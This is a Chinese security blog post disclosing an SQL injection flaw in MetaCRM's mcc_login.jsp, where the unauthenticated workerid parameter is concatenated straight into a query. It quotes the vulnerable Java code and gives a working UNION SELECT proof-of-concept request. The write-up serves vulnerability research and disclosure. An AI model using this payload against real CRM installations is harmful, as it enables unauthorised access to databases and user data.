---
title: "美特CRM mcc_login.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/metasoft-mcc_login-workerid-sqli.html
asset_dir: assets/美特crm-mcc_login.jsp-sql注入漏洞
---

# 美特CRM mcc\_login.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/22 23:33
* 2091浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

CRM

安全

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特软件开创性地在CRM领域中引入用户级产品平台MetaCRM V5/V6，多年来一直在持续地为客户创造价值，大幅提升了用户需求满足度与使用的满意度。针对成长型企业，美特软件用先进的CRM产品与技术，开发了适合中小型企业的产品“美客宝”，以及面向云计算的在线CRM系统。

美特CRM si/callcenter/solarun/mcc\_login.jsp 接口存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入恶意文件，进一步获取服务器系统权限。

客户关系管理

# 漏洞分析

直接看 `si/callcenter/solarun/mcc_login.jsp` 文件业务逻辑实现相关代码

```
<%
response.setHeader("Pragma", "no-cache");
response.setHeader("Cache-Control", "no-store");
response.setDateHeader("Expires", 0);
String strTitle=com.metasoft.framework.pub.env.PackageCfg.getName()+" loading......";
//
String userlogin=request.getParameter("workerid"); //seat login ID
com.metasoft.framework.db.DBManager dm = new com.metasoft.framework.db.DBManager("default");
org.dom4j.Element el =  dm.findOne("select scode from org_employee where scode ='" + userlogin + "' or sctino='" + userlogin + "';");
userlogin = (String)el.attribute("scode").getData();
String passwd=request.getParameter("passwd"); //seat login password (abc123def)
String rtype=request.getParameter("rtype"); //login type (lgn)
//if ("lgn".equalsIgnoreCase(rtype))
  rtype="call400";
%>
```

`workerid` 通过 `request.getParameter` 获取后直接拼接进SQL语句，然后将SQL语句带入 `com.metasoft.framework.db.DBManager` 的 `findOne` 方法里，跟进看下

SQL注入检测工具

```
public Element findOne(String findSql) throws SQLException {
        if (findSql != null && findSql.length() != 0) {
            findSql = this.dbserver.getFunTrimSemicolon(findSql);
            List l = this.find(findSql, 1);
            return l != null && l.size() > 0 ? (Element)l.get(0) : null;
        } else {
            return null;
        }
    }
```

深入探索

网络安全课程

安全工具开发

技术文章订阅

`findSql` 经过 `getFunTrimSemicolon` 处理如下

```
public String getFunTrimSemicolon(String strSQL) {
        return strSQL;
    }
```

直接返回，在默认为 mssql 的时候没有任何处理，但对 MySQL 和 Oracle 有重写，也不过是去除多余空格以和分号

代码安全审计

[![美特CRM mcc_login.jsp SQL注入漏洞](images/img-001-f1e4f88f1d96.webp)](https://image.mrxn.net/89e822be3fde4d33aa65e78a22643aa1.webp)

最后将 `findSql` 带入 `DBManager` 的 `find` 函数执行，全程无任何过滤处理，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)

深入探索

安全认证考试

网页浏览器

Web安全课程

[![美特CRM mcc_login.jsp SQL注入漏洞](images/img-002-e887f9830635.webp)](https://image.mrxn.net/8490cdec1c9148b98f3d593c78fcfad4.webp)

# 漏洞复现

```
GET /si/callcenter/solarun/mcc_login.jsp?workerid=-1'+UNION+ALL+SELECT+@@VERSION-- HTTP/1.1
Host: metasoft.mrxn.net
```

成功在 username 处回显数据库版本信息

漏洞修复方案

[![美特CRM mcc_login.jsp SQL注入漏洞](images/img-003-51ba22401735.webp)](https://image.mrxn.net/782a5d00e2c4421b8a827e8dacd7b31b.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.漏洞分析](#toc-2-)
* [3.漏洞复现](#toc-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[美特CRM mcc\_login.jsp SQL注入漏洞](https://mrxn.net/jswz/metasoft-mcc_login-workerid-sqli.html)  
文章链接：<https://mrxn.net/jswz/metasoft-mcc_login-workerid-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-mcc\_login-workerid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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